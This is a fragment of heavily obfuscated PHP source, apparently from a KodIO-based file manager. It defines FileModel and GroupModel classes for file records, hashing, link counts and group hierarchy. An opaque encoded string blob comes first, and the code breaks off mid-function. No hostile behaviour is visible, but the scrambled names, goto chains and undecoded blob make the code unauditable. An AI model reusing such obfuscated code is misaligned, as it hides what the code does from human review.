5\41\135\103\123\263\25\312\226\147\302".strrev('†«_‡ü$¶iÂš mnÏAĞù'."\0".'!°F©ëé™¤÷¾A~"düs½…¤Ğ¡f¦c—b\'®Á!İ').base64_decode('ybCQDZK/lz9/WyPxR8PEZ7rh5lKnxnjC6r8fOte1DoAVldCSmm4IaMLbQ0dDT+Q42KMW6LMRhK8=')."\151\166\312\75\302\173\367\326\362\101\117\107\114\113\237\360\147\312\355\317\223\243\265\27\136\116\131\126\125\304\176\106\4\11\373\77\320\110\334\352\70\25\45\42\60\175\127\221\224\40\154\142\133\217\23\330"."\253\320\145\102\253\244\6\204\144\224\213\76\347\5\176\241\153\177\77\367\242\200\222\361\266\233\147\114\146\266\45\366\134\175\26\325\124\70\174\110\42\16\344\353\7\224\61\1\152\211\376\361\24\125\173\16"."\x33\xab\xea\xa9\x76\xb5\x90\xb2\xe3\x97\xa\x9\x6\xe5\xe8\xa0\x33\xda\x2b\x81\x81\xf2\xc4\xe5\xb6\xd\x2e\x4c\x31\x5c\x72\xca\x63\x7c\x73\x9a\x2b\x8b\xa9\x54\xa7\x3c\x56\x1\x95\xdd\x79\x66\x50\x0\x61\xa8\x48\x13\x12\x5e"."\40\341\36\167\225\161\361\353\4\57\135\76\301\100\304\162\50\177\241\304\336\56\64\156\30\234\234\7\24\4\167\150\204\335\70\10\277\137\317\374\335\341\242\164\15\145\224\123\334\21\36\256\43\133\327\361"."\117\132\37\122\141\150\114\113\3\70\310\172\334\151\201\332\234\376\302\55\56\72\325\332\222\310\242\122\50\276\342\332\323\302\12\1\241\70\361\110\142\332\14\221\312\37\341\374\152\45\161\304\166\20\142\23"."\xa1\x1c\x99\xce\x72\x62\xc9\x16\x1\xcb\x1a\x4b\x30\xc3\x62\xa2\xa5\x8a\xf6\xee\x46\x2b\x0\xce\xab\x18\x98\x47\x1b\x4f\x38\xcd\x63\x4d\xc2\xf8\x8a\xad\x45\x62\x6\x7b\x6b\x71\xe\xbd\x8c\x66\x24\x4f\xe5\x4f\xdb\x3f\x40\x49"."\146\77\20\344\205\10\333\160\145\247\225\121\255\102\36\134\243\212\331\160\22\314\311\325\70\113\136\143\134\65\223\331\212\171\161\22\314\133\226\114\63\13\53\145\41\237\51\227\214\151\232\127\116\74\64\264"."\x6c\xa4\x23\xd\xe6\xde\xba\x5\xd4\xe9\xe8\x59\x11\xb9\xfc\x73\x84\x79\xec\xd8\x68\xf5\x5b\xb9\x16\x15\x57\xea\xd3\xd5\xa2\x22\xf2\xb4\xb5\xe0\xd8\xb6\x83\xc9\x4a\x32\x92\xa6\x54\x90\x8a\xfc\x1c\xb1\x5c\xfe\xf2\xb4\xa\xa7"."\x9a\xb8\x4c\x38\x39\x87\x2d\x46\x7e\x65\xc9\xe2\x11\x69\xe5\x43\xd4\x70\xc5\x51\x6c\x58\x4f\x37\x6d\x70\x91\x30\xd4\x5c\x63\xc7\x96\xe3\x77\xde\x79\x86\x3f\x24\xd1\x80\x8\xb6\x48\xed\x52\x61\xa4\x40\xfd\x20\x81\x2f\x70\xff"."\202\360\256\243\107\267\323\157\212\350\200\66\127\273\224\75\13\45\301\275\153\105\137\275\16\270\156\56\137\230\346\250\227\54\321\223\61\136\275\150\100\321\26\214\53\40\120\164\306\213\323\351\107\162\174\177"."\213\50\20\370\314\314\53\332\12\243\332\252\360\161\165\166\56\151\71\204\253\220\356\342\373\235\26\127\317\350\221\56\166\377\33\317\350\144\307\27\237\117\40\73\30\2\151\237\204\213\57\7\236\50\161\162"."\104\323\115\170\57\34\10\363\42\372\155\327\114\223\312\30\240\26\43\114\244\367\41\267\63\302\251\53\10\361\127\120\41\155\321\146\63\142\124\44\120\120\220\234\224\300\205\152\104\301\251\110\14\131\42\160".base64_decode('E5tFwuW71Z0l29EMB4AlZkKbIEyA3lfh9YG7zYQsdt2OPxdAuFA8Q0aGW4Ybp7iJkbcTleEkj/A=')."\x31\x23\x2f\x92\x3d\x85\x6\x16\x73\x5c\xf9\x75\x25\x90\xcd\x39\x5e\x4\x7e\xe9\x19\x6d\x23\xc1\x7\xd2\x7d\x3\xfe\x48\x34\x52\x96\x14\xf2\x44\x22\xfd\xc1\xb0\x17\x1b\x8a\x96\x25\xa3\x5c\xc2\x81\x7d\x59\x52\xa8\x3b\xd8\x3b"."\x5d\x9a\xaf\xc7\xe3\xf\x94\xa5\xc1\x3\x7c\x68\xbe\x4a\xdf\x89\xc4\x49\xfe\x10\xaa\xa5\x27\x10\xa0\xd6\x62\xe5\xb5\xf0\x77\xac\xe6\x35\x41\xe7\x56\x7c\x97\xb5\x98\xd5\xe8\xa6\xa5\xcd\x92\x85\x6e\x4a\x47\x64\x3a\x4c\xa0\xf0"."\x67\xcb\x64\x21\xac\xe4\xd9\x96\x96\x50\x9c\x75\x6f\x41\xec\x72\x83\xbe\x63\xca\x2\xc5\xb2\xe5\x87\xa0\x25\xc0\x3\xf7\x5e\x52\x58\x98\xfa\x67\x84\x8f\x66\xb3\xe1\xcf\x54\x61\xd4\x38\xd1\x72\x87\x9f\xd2\xb9\x2c\xa7\x79\x2".base64_decode('HA0cJIQEhhTnYAQglqa20xQbMYUZvfw8DkE4QWC9V1H/DMNaQtinxXLKIqFEkwkctgmwVFSLyhk=')."\42\127\240\126\302\143\355\223\142\130\334\4\131\301\304\212\51\147\350\241\270\135\24\13\247\300\220\112\377\17\112\124\242\344\135\302\0\0"."", 10, -8))); goto Aä‹´…É; Bç«ù©Õ°: class FileModel extends ModelBase { protected $tableName = "\x69\157\137\x66\151\x6c\x65"; protected $tableMeta = array("\x74\141\142\x6c\145\x4e\x61\155\x65" => "\x69\x6f\x5f\x66\x69\154\145\137\155\x65\164\141", "\155\x65\x74\141\106\x69\x65\154\x64" => "\x66\151\x6c\x65\x49\x44"); public function fileInfo($BÙÏ˜Â“ˆ†) { $AÅÍæ«“Íô =& $_SERVER[Ìó]; static $eˆ±»ìÜÙ = array(); if (!isset($eˆ±»ìÜÙ[$BÙÏ˜Â“ˆ†])) { $cƒòºŞ›œ = $AÅÍæ«“Íô[2114]; $EÅåµŞ­Ç… = Model($AÅÍæ«“Íô[417])->field($cƒòºŞ›œ)->where(array($AÅÍæ«“Íô[415] => $BÙÏ˜Â“ˆ†))->find(); $eˆ±»ìÜÙ[$BÙÏ˜Â“ˆ†] = $EÅåµŞ­Ç…; } return $eˆ±»ìÜÙ[$BÙÏ˜Â“ˆ†]; } public function addFileByContent($eİ”éÀ¢ã = '', $EÚ’èô™’ = '') { goto CÒ»‹åÏËí; C—‘¨¿Û‹’: if (file_exists($D˜ó¹…ŸÓ)) { @unlink($D˜ó¹…ŸÓ); } return $AÇ¹øŸ”÷±; goto d‡¼­Åë¶Û; Aé’õ§†±±: $D˜ó¹…ŸÓ = $C«ÁÜÊÁÅ¾ . $cŒŞè§õÆ[2116] . rand_string(16); file_put_contents($D˜ó¹…ŸÓ, $eİ”éÀ¢ã); $AÇ¹øŸ”÷± = $this->addFile($D˜ó¹…ŸÓ, $EÚ’èô™’, !0); goto C—‘¨¿Û‹’; CÒ»‹åÏËí: $cŒŞè§õÆ =& $_SERVER[Ìó]; $C«ÁÜÊÁÅ¾ = TEMP_PATH . $cŒŞè§õÆ[2115]; if (!is_dir($C«ÁÜÊÁÅ¾)) { mk_dir($C«ÁÜÊÁÅ¾); } goto Aé’õ§†±±; d‡¼­Åë¶Û: } public function createFileName($EÉÚ‘ºÄÖ½) { goto D²í•›½Ñî; E‡Ç¢Îå: if (!$FµµˆçÕ¾ && !Cache::get($e¥¼¥½õñ)) { $FµµˆçÕ¾ = !0; $eç­»ê± = IO::mkdir($aÒÚÈß½‡Ÿ); if (!IO::exist($eç­»ê± . $DÀí£ºĞÅ•[2118])) { IO::mkfile($eç­»ê± . $DÀí£ºĞÅ•[2118]); } Cache::set($e¥¼¥½õñ, 1, 3600 * 2); } return $d³Ç“ÇšƒÙ; goto eŸ†ÇÙ¡‘; D²í•›½Ñî: $DÀí£ºĞÅ• =& $_SERVER[Ìó]; $aÁ‰—ÚËÀî = IO::init($DÀí£ºĞÅ•[8]); $d³Ç“ÇšƒÙ = $this->makeFilePath($EÉÚ‘ºÄÖ½, $aÁ‰—ÚËÀî); goto f¬©»Ä±ù; f¬©»Ä±ù: $aÒÚÈß½‡Ÿ = $aÁ‰—ÚËÀî->pathFather($d³Ç“ÇšƒÙ); static $FµµˆçÕ¾ = false; $e¥¼¥½õñ = $DÀí£ºĞÅ•[2117] . md5($aÒÚÈß½‡Ÿ); goto E‡Ç¢Îå; eŸ†ÇÙ¡‘: } public function makeFilePath($c×©Œ¢Úç, $bÔßª¯Š»ª) { goto bèêƒö›··; bèêƒö›··: $F½°Ïùµ±‚ =& $_SERVER[Ìó]; $dŞãÓÇËµµ = Model($F½°Ïùµ±‚[1084])->get($F½°Ïùµ±‚[2119]); $b‰­ƒ¹ï» = KodIO::defaultIO() . date($F½°Ïùµ±‚[2120]); goto DÚ¢–ßº; DÚ¢–ßº: $E¸Ç„¸Ø„è = $b‰­ƒ¹ï» . rand_string(5) . short_id(100); $c×©Œ¢Úç = str_replace($F½°Ïùµ±‚[8], $F½°Ïùµ±‚[70], KodIO::clear($c×©Œ¢Úç)); if (!$c×©Œ¢Úç) { $dŞãÓÇËµµ = $F½°Ïùµ±‚[2121]; } goto Bîé “ãĞÆ; Bîé “ãĞÆ: switch ($dŞãÓÇËµµ) { case $F½°Ïùµ±‚[2122]: $E¸Ç„¸Ø„è = $E¸Ç„¸Ø„è . $F½°Ïùµ±‚[91] . $bÔßª¯Š»ª->ext($c×©Œ¢Úç); if ($bÔßª¯Š»ª->ext($c×©Œ¢Úç) == $F½°Ïùµ±‚[2062]) { $E¸Ç„¸Ø„è .= $F½°Ïùµ±‚[2123]; } break; case $F½°Ïùµ±‚[2124]: goto f›‚êÉ¹ÀÅ; DÕ¢Å‰Òºë: break; goto F§ª©ÄâÊÊ; F˜º‘–ê«Å: if ($bÔßª¯Š»ª->ext($c×©Œ¢Úç) == $F½°Ïùµ±‚[2062]) { $c×©Œ¢Úç .= $F½°Ïùµ±‚[2123]; } $f†Í™™ë’‚ = IO::fileNameAuto($b‰­ƒ¹ï», $c×©Œ¢Úç); $E¸Ç„¸Ø„è = $b‰­ƒ¹ï» . $f†Í™™ë’‚; goto DÕ¢Å‰Òºë; f›‚êÉ¹ÀÅ: $B’»•™¡…Æ = Model($F½°Ïùµ±‚[1084])->get($F½°Ïùµ±‚[1310]); $Fˆ´„¶ø× = substr(md5($F½°Ïùµ±‚[1882] . $B’»•™¡…Æ . date($F½°Ïùµ±‚[683])), 0, 8); $b‰­ƒ¹ï» = KodIO::defaultIO() . date($F½°Ïùµ±‚[2125]) . $Fˆ´„¶ø× . $F½°Ïùµ±‚[8]; goto F˜º‘–ê«Å; F§ª©ÄâÊÊ: case $F½°Ïùµ±‚[2121]: break; default: break; } return $E¸Ç„¸Ø„è; goto B­§¤¤¾©Ù; B­§¤¤¾©Ù: } public function addFileByRemote($CèàäÉ™ŞŸ, $B—ŸÜ†ÖğÅ, $fìÜ¤ÍÅ‹Ï = array()) { goto b…ï…—áô; bŸ‚¹µˆ¥: $A°íİøš©· = IO::hashMd5($CèàäÉ™ŞŸ, $e½’„‡Ñà); $c´ §¨é‰ = KodIO::defaultDriver(); $a™¹ÏÈ¶ = array($C¤õŞâĞï[515] => IO::size($CèàäÉ™ŞŸ), $C¤õŞâĞï[2126] => 1, $C¤õŞâĞï[382] => $B—ŸÜ†ÖğÅ, $C¤õŞâĞï[731] => $c´ §¨é‰[$C¤õŞâĞï[363]], $C¤õŞâĞï[383] => $CèàäÉ™ŞŸ, $C¤õŞâĞï[2127] => $fìÜ¤ÍÅ‹Ï[$C¤õŞâĞï[160]] ? $fìÜ¤ÍÅ‹Ï[$C¤õŞâĞï[160]] : IO::hashSimple($CèàäÉ™ŞŸ), $C¤õŞâĞï[2128] => $A°íİøš©· ? $A°íİøš©· : $e½’„‡Ñà); goto b½ÑÕŞ²óå; b…ï…—áô: $C¤õŞâĞï =& $_SERVER[Ìó]; if (!IO::exist($CèàäÉ™ŞŸ)) { return !1; } $e½’„‡Ñà = $fìÜ¤ÍÅ‹Ï[$C¤õŞâĞï[159]] ? $fìÜ¤ÍÅ‹Ï[$C¤õŞâĞï[159]] : $C¤õŞâĞï[33]; goto bŸ‚¹µˆ¥; b½ÑÕŞ²óå: if ($B¯Ìô¢ïó = $this->addFileCheckExist($a™¹ÏÈ¶[$C¤õŞâĞï[160]], $a™¹ÏÈ¶[$C¤õŞâĞï[159]], $a™¹ÏÈ¶[$C¤õŞâĞï[77]])) { return $B¯Ìô¢ïó; } return $this->addFileData($a™¹ÏÈ¶); goto e¶„âì•Ö; e¶„âì•Ö: } private function addFileData($a‰§Õ‚ß·¬) { $B÷ì…¿¼œæ =& $_SERVER[Ìó]; if (!$a‰§Õ‚ß·¬) { return !1; } $a‰§Õ‚ß·¬[$B÷ì…¿¼œæ[77]] = intval($a‰§Õ‚ß·¬[$B÷ì…¿¼œæ[77]]); if (!$a‰§Õ‚ß·¬[$B÷ì…¿¼œæ[77]] && strlen($a‰§Õ‚ß·¬[$B÷ì…¿¼œæ[160]]) > 32) { $a‰§Õ‚ß·¬[$B÷ì…¿¼œæ[77]] = intval(substr($a‰§Õ‚ß·¬[$B÷ì…¿¼œæ[160]], 32)); } $CÑæœ µä… = $this->add($a‰§Õ‚ß·¬); return $this->find($CÑæœ µä…); } public function addFile($aóéÌäÈÅÉ, $Fİæ¸¾ÁÚŞ, $e…øŞËîÆ = false) { $BŒõ“ŒÁ = IO::hashSimple($aóéÌäÈÅÉ); $d‰§Ç˜ƒÍ– = IO::hashMd5($aóéÌäÈÅÉ); $f½½ï°™¾é = IO::size($aóéÌäÈÅÉ); if ($aÎœ²²Ú› = $this->addFileCheckExist($BŒõ“ŒÁ, $d‰§Ç˜ƒÍ–, $f½½ï°™¾é)) { return $aÎœ²²Ú›; } $e®Û¸ˆ‰Ï = $this->addFileMake($aóéÌäÈÅÉ, $f½½ï°™¾é, $BŒõ“ŒÁ, $d‰§Ç˜ƒÍ–, $Fİæ¸¾ÁÚŞ, $e…øŞËîÆ); return $this->addFileData($e®Û¸ˆ‰Ï); } public function addFileMake($B¦¤ëãšº, $aİ”ÏÜóÑá, $F”ù˜‹†‘‘, $FíÏ”›·Û‡, $cï°Ä”›óÁ, $F••¡®Õ½­) { goto b¸§ƒ­§ª¼; E÷àÆ°Å†Ô: $Eğí…ƒÇ„ = get_path_this($f ¢¹ù£ñù); if ($F••¡®Õ½­) { $CºÄñÙÈÇ… = IO::move($B¦¤ëãšº, $aÛœ¨ºåÇá, !1, $Eğí…ƒÇ„); } else { $CºÄñÙÈÇ… = IO::copy($B¦¤ëãšº, $aÛœ¨ºåÇá, !1, $Eğí…ƒÇ„); } if (!$CºÄñÙÈÇ…) { return !1; } goto bäÇÃºÔØ; b¸§ƒ­§ª¼: $DÀŒ¹ÂÑ† =& $_SERVER[Ìó]; $f ¢¹ù£ñù = $this->createFileName($cï°Ä”›óÁ); $aÛœ¨ºåÇá = get_path_father($f ¢¹ù£ñù); goto E÷àÆ°Å†Ô; bäÇÃºÔØ: $e¸ƒùå¬Ô‰ = KodIO::defaultDriver(); $eµºè·ãÖ² = array($DÀŒ¹ÂÑ†[515] => $aİ”ÏÜóÑá, $DÀŒ¹ÂÑ†[2126] => 1, $DÀŒ¹ÂÑ†[382] => $cï°Ä”›óÁ, $DÀŒ¹ÂÑ†[731] => $e¸ƒùå¬Ô‰[$DÀŒ¹ÂÑ†[363]], $DÀŒ¹ÂÑ†[383] => $f ¢¹ù£ñù, $DÀŒ¹ÂÑ†[2127] => $F”ù˜‹†‘‘, $DÀŒ¹ÂÑ†[2128] => $FíÏ”›·Û‡); return $eµºè·ãÖ²; goto CŠ‡ñßˆµó; CŠ‡ñßˆµó: } public function addFileCheckExist($f‰§ÆÃ°„, $f«òÕ­ßÕğ, $bÔ•ß…ï©é) { $eÚ°×Ó‹ÃÃ =& $_SERVER[Ìó]; $B°ÄƒåìùÆ = $this->findByHash($f‰§ÆÃ°„, $f«òÕ­ßÕğ); if (!$B°ÄƒåìùÆ) { return !1; } $câ–»×ÜÒŠ = array($eÚ°×Ó‹ÃÃ[2126] => intval($B°ÄƒåìùÆ[$eÚ°×Ó‹ÃÃ[2129]]) + 1, $eÚ°×Ó‹ÃÃ[515] => $bÔ•ß…ï©é); $this->where(array($eÚ°×Ó‹ÃÃ[415] => $B°ÄƒåìùÆ[$eÚ°×Ó‹ÃÃ[414]]))->save($câ–»×ÜÒŠ); return $B°ÄƒåìùÆ; } public function remove($D¸õŞÁ»İ) { $this->linkCountChange($D¸õŞÁ»İ, !1); $this->clearEmpty(); return !0; } public function linkAdd($a‚íØ˜ˆîŠ) { $this->linkCountChange($a‚íØ˜ˆîŠ, !0); } public function linkCountChange($E‹½øó‚Ùƒ, $Fè•³»Ãó¸) { goto aÙëå§š‘ê; bÎµº¬œ×: foreach ($cœöÜ£¸ê† as $CÙå–”†ù => $e„‹¶à¤È¥) { $EŒĞ¾¼Ó = $e„‹¶à¤È¥ . $dÊšÒÍ®³[33]; if (!$EÊ‡©£ê…[$EŒĞ¾¼Ó]) { $EÊ‡©£ê…[$EŒĞ¾¼Ó] = array(); } $EÊ‡©£ê…[$EŒĞ¾¼Ó][] = $CÙå–”†ù; } foreach ($EÊ‡©£ê… as $e„‹¶à¤È¥ => $D™¥†Ü³Š•) { if (!$D™¥†Ü³Š•) { continue; } $e„‹¶à¤È¥ = $Fè•³»Ãó¸ ? $e„‹¶à¤È¥ : -intval($e„‹¶à¤È¥); $Dæ¾„‚®Å = array($dÊšÒÍ®³[414] => array($dÊšÒÍ®³[7], $D™¥†Ü³Š•)); if ($e„‹¶à¤È¥ < 0) { $Dæ¾„‚®Å[$dÊšÒÍ®³[2129]] = array($dÊšÒÍ®³[927], abs($e„‹¶à¤È¥)); } $this->where($Dæ¾„‚®Å)->setAdd($dÊšÒÍ®³[2129], $e„‹¶à¤È¥); } goto Eå‹É‹¬×Æ; Aïùœ¡ìÈá: $cœöÜ£¸ê† = array(); foreach ($E‹½øó‚Ùƒ as $CÙå–”†ù) { $EŒĞ¾¼Ó = $CÙå–”†ù . $dÊšÒÍ®³[33]; if (!$cœöÜ£¸ê†[$EŒĞ¾¼Ó]) { $cœöÜ£¸ê†[$EŒĞ¾¼Ó] = 0; } $cœöÜ£¸ê†[$EŒĞ¾¼Ó]++; } $EÊ‡©£ê… = array(); goto bÎµº¬œ×; aÙëå§š‘ê: $dÊšÒÍ®³ =& $_SERVER[Ìó]; if (!$E‹½øó‚Ùƒ) { return; } if (!is_array($E‹½øó‚Ùƒ)) { $E‹½øó‚Ùƒ = array($E‹½øó‚Ùƒ); } goto Aïùœ¡ìÈá; Eå‹É‹¬×Æ: } public function findByHash($CêÚš†ÌÃ, $a¢«ØÈ°Ñê = false) { $F‚ÔÆ†§ñç =& $_SERVER[Ìó]; if (!$CêÚš†ÌÃ && !$a¢«ØÈ°Ñê) { return !1; } $Aâó¨„Ş‰ö = array($F‚ÔÆ†§ñç[2127] => $CêÚš†ÌÃ); if ($a¢«ØÈ°Ñê) { $Aâó¨„Ş‰ö = array($F‚ÔÆ†§ñç[2128] => $a¢«ØÈ°Ñê); } return $this->order($F‚ÔÆ†§ñç[2130])->where($Aâó¨„Ş‰ö)->find(); } public function clearEmpty($Aù›éôÊ£‘ = 0) { goto bÇĞáâé¸; bÇĞáâé¸: $Cğ‘Ñé¡â =& $_SERVER[Ìó]; $få§Û‚Ùø¡ = time() - 3600 * 24 * $Aù›éôÊ£‘; $F°Éƒ—ÃĞ½ = $Cğ‘Ñé¡â[2131] . $få§Û‚Ùø¡; goto EÁ®Š‘ÕÇ; EÁ®Š‘ÕÇ: $fÚ½¦Öñ’³ = $this->where($F°Éƒ—ÃĞ½)->select(); if (!$fÚ½¦Öñ’³) { return; } $D•±›Ÿ¬ÑÎ = new Task($Cğ‘Ñé¡â[2132], $Cğ‘Ñé¡â[33], count($fÚ½¦Öñ’³)); goto B¥áğÏ‘¼Í; B¥áğÏ‘¼Í: foreach ($fÚ½¦Öñ’³ as $eÉ•ù‚†ç) { $D•±›Ÿ¬ÑÎ->update(1); $this->resetFile($eÉ•ù‚†ç); } $D•±›Ÿ¬ÑÎ->end(); goto BÅ¡Şçš·; BÅ¡Şçš·: } private function resetFile($eè¹¥²å) { goto BŸ¾Â­ÌÊÂ; DŸàµ«£Àº: $c»Ëæªæ¤ = Model($A”Òù˜øÍ†[2133])->where($b®¨ß¦ÏõŠ)->count(); $BÇ¨‹õÁ†ù = intval($F¼Ö“Ú‚µ) + intval($c»Ëæªæ¤); if ($BÇ¨‹õÁ†ù == 0) { IO::remove($eè¹¥²å[$A”Òù˜øÍ†[75]]); $this->where($b®¨ß¦ÏõŠ)->delete(); $this->metaSet($eè¹¥²å[$A”Òù˜øÍ†[414]], null, null); return; } goto A‘Ş‘ì‚ª; BŸ¾Â­ÌÊÂ: $A”Òù˜øÍ† =& $_SERVER[Ìó]; $b®¨ß¦ÏõŠ = array($A”Òù˜øÍ†[415] => $eè¹¥²å[$A”Òù˜øÍ†[414]]); $F¼Ö“Ú‚µ = Model($A”Òù˜øÍ†[1106])->where($b®¨ß¦ÏõŠ)->count(); goto DŸàµ«£Àº; A‘Ş‘ì‚ª: if ($eè¹¥²å[$A”Òù˜øÍ†[2129]] != $BÇ¨‹õÁ†ù) { $this->where($b®¨ß¦ÏõŠ)->save(array($A”Òù˜øÍ†[2126] => $BÇ¨‹õÁ†ù)); } goto FØÁ…¡‹ôŞ; FØÁ…¡‹ôŞ: } public function storageInfo($Dºò‰˜–‡® = false) { goto aÏÛĞ„Ëã; d´‡¥–Øˆ˜: $E„‰£†‡§ = 1; $bÚÒÃ©µ× = 0; $AùÙ•ÁÁØĞ = 5000; goto C‹–‹èÖƒÎ; C‹–‹èÖƒÎ: for ($b÷‚óëÔ÷² = 0; $b÷‚óëÔ÷² < $D‚öŠº©¢¢; $b÷‚óëÔ÷² = $b÷‚óëÔ÷² + $AùÙ•ÁÁØĞ) { $EÏ›Ï¢ñÔ = $this->limit($b÷‚óëÔ÷², $b÷‚óëÔ÷² + $AùÙ•ÁÁØĞ)->select(); foreach ($EÏ›Ï¢ñÔ as $a›Ä­õã‘) { $E„‰£†‡§ += $a›Ä­õã‘[$eÁÅ„—ê½‹[77]] * $a›Ä­õã‘[$eÁÅ„—ê½‹[2129]]; $aÈÊ‹í…”É += $a›Ä­õã‘[$eÁÅ„—ê½‹[77]] * ($a›Ä­õã‘[$eÁÅ„—ê½‹[2129]] - 1); $bÚÒÃ©µ× += $a›Ä­õã‘[$eÁÅ„—ê½‹[2129]]; } } $F¸ë¹Â¦¦È = array($eÁÅ„—ê½‹[2134] => $E„‰£†‡§, $eÁÅ„—ê½‹[2135] => $aÈÊ‹í…”É, $eÁÅ„—ê½‹[2136] => $aÈÊ‹í…”É / $E„‰£†‡§, $eÁÅ„—ê½‹[81] => $D‚öŠº©¢¢, $eÁÅ„—ê½‹[2137] => $bÚÒÃ©µ×); return $F¸ë¹Â¦¦È; goto AóÆÖø‰†ƒ; aÏÛĞ„Ëã: $eÁÅ„—ê½‹ =& $_SERVER[Ìó]; $D‚öŠº©¢¢ = $this->count() + 0.0; $aÈÊ‹í…”É = 0; goto d´‡¥–Øˆ˜; AóÆÖø‰†ƒ: } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\165\x70"; protected $tableMeta = array("\x74\141\142\154\x65\x4e\141\155\145" => "\x67\x72\157\x75\160\x5f\155\145\164\x61", "\155\145\x74\141\106\151\145\154\144" => "\x67\x72\157\165\x70\111\x44"); protected function cacheFunctionAlias($f¬Ñ”‰ è¼) { $aî”†Á›“Î =& $_SERVER[Ìó]; return array($aî”†Á›“Î[2138] => array($f¬Ñ”‰ è¼[0], $aî”†Á›“Î[2139]), $aî”†Á›“Î[2140] => array($f¬Ñ”‰ è¼[0], $aî”†Á›“Î[2139])); } protected function getInfo($fˆõÁˆ¦—) { $b’ø«ÉµìÊ = $this->getInfoSimple($fˆõÁˆ¦—); if (!$b’ø«ÉµìÊ) { return !1; } return $this->_listDataApplyItem($b’ø«ÉµìÊ); } protected function getInfoSimple($aç‚œ¾Û¥Ò, $E²—Ñø¦Ü = false) { $Aìçß«òÏç =& $_SERVER[Ìó]; if ($E²—Ñø¦Ü) { $d½óÊ†É˜ = array($Aìçß«òÏç[2072] => intval($aç‚œ¾Û¥Ò)); $bë¨â™¬„Ö = $this->where($d½óÊ†É˜)->find(); return is_array($bë¨â™¬„Ö) ? $bë¨â™¬„Ö : array(); } return $this->cacheFunctionGet($Aìçß«òÏç[2141], $aç‚œ¾Û¥Ò); } protected function groupAdd($eÓĞ…ÖÍ„) { goto AøÑã«; a»æ†­ÃËÄ: Model($D¿¯ÕÂÙ®é[1106])->groupRootAdd($Aöá¾ÔÅ); return $Aöá¾ÔÅ; goto Bß½×ù¶†; AøÑã«: $D¿¯ÕÂÙ®é =& $_SERVER[Ìó]; if (!$eÓĞ…ÖÍ„[$D¿¯ÕÂÙ®é[456]] && isset($eÓĞ…ÖÍ„[$D¿¯ÕÂÙ®é[2072]]) && $eÓĞ…ÖÍ„[$D¿¯ÕÂÙ®é[2072]] == 1) { if ($C«£ŠôÆÂî = $this->getInfoSimple($eÓĞ…ÖÍ„[$D¿¯ÕÂÙ®é[2072]], !0)) { return $eÓĞ…ÖÍ„[$D¿¯ÕÂÙ®é[2072]]; } } else { $C«£ŠôÆÂî = $this->getInfoSimple($eÓĞ…ÖÍ„[$D¿¯ÕÂÙ®é[456]]); if (!$C«£ŠôÆÂî) { return !1; } } $DÏ ÁÂï“‚ = $D¿¯ÕÂÙ®é[465]; goto FŠº»·™¹Û; FŠº»·™¹Û: if ($C«£ŠôÆÂî[$D¿¯ÕÂÙ®é[454]]) { $DÏ ÁÂï“‚ = $C«£ŠôÆÂî[$D¿¯ÕÂÙ®é[454]] . $C«£ŠôÆÂî[$D¿¯ÕÂÙ®é[2072]] . $D¿¯ÕÂÙ®é[47]; } $A“¸ç£àÃ• = array($D¿¯ÕÂÙ®é[382] => $this->groupNameAuto($eÓĞ…ÖÍ„[$D¿¯ÕÂÙ®é[456]], $eÓĞ…ÖÍ„[$D¿¯ÕÂÙ®é[28]]), $D¿¯ÕÂÙ®é[364] => $eÓĞ…ÖÍ„[$D¿¯ÕÂÙ®é[456]], $D¿¯ÕÂÙ®é[520] => $DÏ ÁÂï“‚, $D¿¯ÕÂÙ®é[2142] => $eÓĞ…ÖÍ„[$D¿¯ÕÂÙ®é[2056]], $D¿¯ÕÂÙ®é[2143] => 0, $D¿¯ÕÂÙ®é[2076] => 0); if (isset($eÓĞ…ÖÍ„[$D¿¯ÕÂÙ®é[2093]])) { $A“¸ç£àÃ•[$D¿¯ÕÂÙ®é[2093]] = $eÓĞ…ÖÍ„[$D¿¯ÕÂÙ®é[2093]]; } else { $dĞ–éå«Î¦ = $this->max($D¿¯ÕÂÙ®é[2093]); if (!$dĞ–éå«Î¦) { $dĞ–éå«Î¦ = 0; } $A“¸ç£àÃ•[$D¿¯ÕÂÙ®é[2093]] = $dĞ–éå«Î¦ + 1; } goto B’õƒ³ø¬; B’õƒ³ø¬: if (!empty($eÓĞ…ÖÍ„[$D¿¯ÕÂÙ®é[2072]])) { $A“¸ç£àÃ•[$D¿¯ÕÂÙ®é[2072]] = $eÓĞ…ÖÍ„[$D¿¯ÕÂÙ®é[2072]]; } $Aöá¾ÔÅ = $this->add($A“¸ç£àÃ•); $this->setNamePinyin($Aöá¾ÔÅ, $A“¸ç£àÃ•[$D¿¯ÕÂÙ®é[28]]); goto a»æ†­ÃËÄ; Bß½×ù¶†: } protected function groupEdit($CÀĞÓ·íêñ, $cŞøÅõ“Œ) { $cöîÚøÃÓÖ =& $_SERVER[Ìó]; if (!empty($cŞøÅõ“Œ[$cöîÚøÃÓÖ[456]])) { $e’–¨›çä¹ = $this->getInfoSimple($CÀĞÓ·íêñ); $DÈø’öìÑ² = $this->getInfoSimple($cŞøÅõ“Œ[$cöîÚøÃÓÖ[456]]); if (!$e’–¨›çä¹ || !$DÈø’öìÑ²) { return !1; } if ($e’–¨›çä¹[$cöîÚøÃÓÖ[2072]] == $DÈø’öìÑ²[$cöîÚøÃÓÖ[2072]]) { return !1; } if ($cŞøÅõ“Œ[$cöîÚøÃÓÖ[456]] != $e’–¨›çä¹[$cöîÚøÃÓÖ[456]]) { if ($DÈø’öìÑ²[$cöîÚøÃÓÖ[454]] !== $e’–¨›çä¹[$cöîÚøÃÓÖ[454]] && strpos($DÈø’öìÑ²[$cöîÚøÃÓÖ[454]], $e’–¨›çä¹[$cöîÚøÃÓÖ[454]] . $e’–¨›çä¹[$cöîÚøÃÓÖ[2072]] . $cöîÚøÃÓÖ[47]) === 0) { return !1; } $cŞøÅõ“Œ[$cöîÚøÃÓÖ[520]] = $DÈø’öìÑ²[$cöîÚøÃÓÖ[454]] . $cŞøÅõ“Œ[$cöîÚøÃÓÖ[456]] . $cöîÚøÃÓÖ[47]; $this->_changeChildLevel($e’–¨›çä¹, $DÈø’öìÑ²); } } if (isset($cŞøÅõ“Œ[$cöîÚøÃÓÖ[28]])) { $this->setNamePinyin($CÀĞÓ·íêñ, $cŞøÅõ“Œ[$cöîÚøÃÓÖ[28]]); } return $this->where(array($cöîÚøÃÓÖ[2144] => $CÀĞÓ·íêñ))->save($cŞøÅõ“Œ); } private function _changeChildLevel($aÂœñé„İª, $eÉŒ¬è¸ÜÙ, $EÛ‰Ä¥ÌŸ = false) { goto dÎ¥Ø±„œŒ; F†èæÙÀ•: 